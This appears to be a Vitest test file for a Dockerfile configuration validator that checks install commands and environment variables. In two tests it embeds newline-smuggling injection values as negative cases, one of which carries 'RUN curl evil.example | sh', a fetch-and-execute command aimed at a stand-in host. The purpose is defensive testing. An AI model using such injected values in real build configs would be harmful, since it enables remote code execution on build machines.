import { describe, it, expect } from 'vitest';
import { validate_dockerfile } from '../../../../src/tools/configured_provider/dockerfile.js';

describe('validate_dockerfile', () => {
    it('returns undefined when the block is omitted', () => {
        expect(validate_dockerfile(undefined)).toBeUndefined();
    });

    it('returns empty install + environment when the block is an empty mapping', () => {
        expect(validate_dockerfile({})).toEqual({ install: [], environment: {} });
    });

    it('accepts a fully-specified block and preserves install order', () => {
        const result = validate_dockerfile({
            install: ['apt-get update', 'apt-get install -y git'],
            environment: { NODE_ENV: 'production', HOME: '/home/patchlab' },
        });
        expect(result).toEqual({
            install: ['apt-get update', 'apt-get install -y git'],
            environment: { NODE_ENV: 'production', HOME: '/home/patchlab' },
        });
    });

    it('defaults install to [] when only environment is provided', () => {
        const result = validate_dockerfile({ environment: { K: 'v' } });
        expect(result).toEqual({ install: [], environment: { K: 'v' } });
    });

    it('defaults environment to {} when only install is provided', () => {
        const result = validate_dockerfile({ install: ['apt update'] });
        expect(result).toEqual({ install: ['apt update'], environment: {} });
    });

    it('rejects non-object blocks', () => {
        expect(() => validate_dockerfile('string')).toThrow(/must be a mapping/);
        expect(() => validate_dockerfile([])).toThrow(/must be a mapping/);
        expect(() => validate_dockerfile(null)).toThrow(/must be a mapping/);
    });

    it('rejects unknown fields in the block', () => {
        expect(() => validate_dockerfile({ foo: 1 })).toThrow(/unknown field/);
    });

    it('rejects install that is not an array', () => {
        expect(() => validate_dockerfile({ install: 'apt update' })).toThrow(/list of strings/);
    });

    it('rejects non-string install entries with the indexed field path', () => {
        let caught: { field_path?: string } | null = null;
        try {
            validate_dockerfile({ install: ['ok', 42] });
        } catch (error) {
            caught = error as { field_path?: string };
        }
        expect(caught?.field_path).toBe('dockerfile.install[1]');
    });

    it('rejects empty / whitespace-only install entries', () => {
        expect(() => validate_dockerfile({ install: [''] })).toThrow(/non-empty string/);
        expect(() => validate_dockerfile({ install: ['   '] })).toThrow(/non-empty string/);
    });

    it('rejects install entries containing a newline (Dockerfile directive injection)', () => {
        // Each entry renders as a single `RUN ${entry}` line; a newline would end
        // the RUN and inject a separate directive the trust prompt would not
        // surface as distinct (install entries are shown joined by ', ').
        expect(() =>
            validate_dockerfile({ install: ['apt-get install -y foo\nLABEL evil=1'] }),
        ).toThrow(/newlines or ASCII control characters/);
    });

    it('rejects install entries containing other ASCII control characters', () => {
        expect(() =>
            validate_dockerfile({ install: ['echo a\x07b'] }),
        ).toThrow(/newlines or ASCII control characters/);
    });

    it('rejects environment that is not a mapping', () => {
        expect(() => validate_dockerfile({ environment: ['KEY=VALUE'] })).toThrow(/mapping/);
    });

    it('rejects empty environment keys', () => {
        expect(() => validate_dockerfile({ environment: { '': 'value' } })).toThrow(/non-empty/);
    });

    it('rejects environment keys containing =', () => {
        expect(() => validate_dockerfile({ environment: { 'A=B': 'v' } })).toThrow(/must not contain `=`/);
    });

    it('rejects environment keys containing ASCII control characters', () => {
        expect(() => validate_dockerfile({ environment: { 'K\x07': 'v' } })).toThrow(/null bytes|control/);
    });

    it('rejects non-string environment values with the keyed field path', () => {
        let caught: { field_path?: string } | null = null;
        try {
            validate_dockerfile({ environment: { MODE: 42 } });
        } catch (error) {
            caught = error as { field_path?: string };
        }
        expect(caught?.field_path).toBe('dockerfile.environment.MODE');
    });

    it('rejects environment values containing a newline (Dockerfile directive injection)', () => {
        // A newline in the value would terminate the `ENV KEY=value` line and
        // let the rest inject an arbitrary directive such as a `RUN`.
        expect(() =>
            validate_dockerfile({ environment: { TOKEN: 'x\nRUN curl evil.example | sh' } }),
        ).toThrow(/newlines or ASCII control characters/);
    });

    it('rejects environment values containing other ASCII control characters', () => {
        expect(() =>
            validate_dockerfile({ environment: { K: 'a\x07b' } }),
        ).toThrow(/newlines or ASCII control characters/);
    });
});
